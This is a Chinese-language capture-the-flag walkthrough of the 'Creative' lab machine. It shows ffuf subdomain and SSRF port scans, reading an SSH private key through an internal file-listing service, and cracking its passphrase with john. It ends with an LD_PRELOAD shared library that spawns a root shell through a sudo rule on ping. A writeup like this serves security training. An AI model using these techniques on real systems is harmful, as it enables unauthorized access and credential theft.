Creative

Exploit a vulnerable web application and some misconfigurations to gain root privileges.

端口扫描，有 80 和 22 端口

序号 || Host地址 || 端口 || 协议 || Uri地址 || 标题 || Banner || 状态码 
1 || 10.146.186.245 || 80 || HTTP || http://10.146.186.245:80 || 301 Moved Permanently || nginx/1.18.0 (Ubuntu),Nginx 1.18.0 || 301
2 || 10.146.186.245 || 22 || SSH || 10.146.186.245:22 ||  || OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 || 0

访问 80 端口会重定向到 creative.thm，修改 /etc/hosts 文件即可正常访问

这种重定向的一般都是有子域名的，用 ffuf 扫描

得到子域名 beta，同样添加到 /etc/hosts 里面

# ffuf -w /usr/share/wordlists/Simple_Subdomains.txt -u http://creative.thm/ -H "Host:FUZZ.creative.thm" -fw 6 
________________________________________________
beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 327ms]

访问 beta.creative.thm，是一个输入框，可以提交 url 进行测试，首先就想到了 ssrf

首先输入 file://etc/passwd，结果返回 Dead

输入 https://baidu.com 也返回此页面

再尝试提交 http://creative.thm/，成功返回了主页面

同样经过测试，当提交本地地址 http://127.0.0.1/ 也会返回该页面

也就是说当输入该 web 服务器可以连接的页面是会返回响应的内容，不能则返回 Dead，并且看起来不能访问外部的网站

因此，我们可以利用此功能来获取内部 web 服务器

使用 ffuf 扫描，得到端口 1337

# ffuf -u 'http://beta.creative.thm/' -d "url=http://127.0.0.1:FUZZ/" -w <(seq 1 65535) -H 'Content-Type: application/x-www-form-urlencoded' -mc all -t 100 -fs 13
________________________________________________
80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 447ms]
1337                    [Status: 200, Size: 1143, Words: 40, Lines: 39, Duration: 679ms]

输入 http://127.0.0.1:1337 返回了页面，显示了根目录下的文件

因此可以借助该功能读取 web 服务器里面的文件内容

输入 http//127.0.0.1:1337/home 找到用户 saad，输入 http://127.0.0.1:1337/home/saad 进入用户目录

首先有一个 user.txt，可以获取第一个 flag

有 .bash_history 记录了用户输入的命令，但是目前用不到

还有一个 .ssh，存放了 ssh 相关的东西，由于开启了 22 端口，所以是一个可以利用的点

输入 http://127.0.0.1:1337/home/saad/.ssh 查看文件内容

在 .ssh 目录下发现了私钥 id_rsa

保存该私钥到 kali 里面，给予 600 权限

利用 ssh2john 将私钥转化成 John 能识别的哈希格式

再利用 john 破解该私钥，得到密码 sweetness

# chmod 600 id_rsa
# ssh2john id_rsa > id_rsa.hash
# john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

有了密码就可以查看权限 sudo

发现可以以 root 运行 /usr/bin/ping ，并且配置里面保留了 LD_PRELOAD 环境变量，这样我们就可以通过设置环境变量来运行命令

saad@ip-10-146-186-245:~$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on ip-10-146-186-245:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-146-186-245:
    (root) /usr/bin/ping

该变量用于指定进程在加载任何其他库之前要加载的库。

我们可以利用这一点，ping 以root运行，预加载我们写的恶意 so 库，就能直接提权

用 nano 编写一个恶意共享库 a.c，ctrl + o 再回车，然后 ctrl +x 退出

saad@ip-10-146-186-245:~$ nano a.c
saad@ip-10-146-186-245:~$ cat a.c
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        system("/bin/sh");
}

用 gcc 编译成动态链接库 a.so，再利用LD_PRELOAD提权

成功得到 root 权限，并获取第二个 flag

saad@ip-10-146-186-245:~$ gcc -fPIC -shared -o a.so a.c -nostartfiles
saad@ip-10-146-186-245:~$ sudo LD_PRELOAD=./a.so /usr/bin/ping
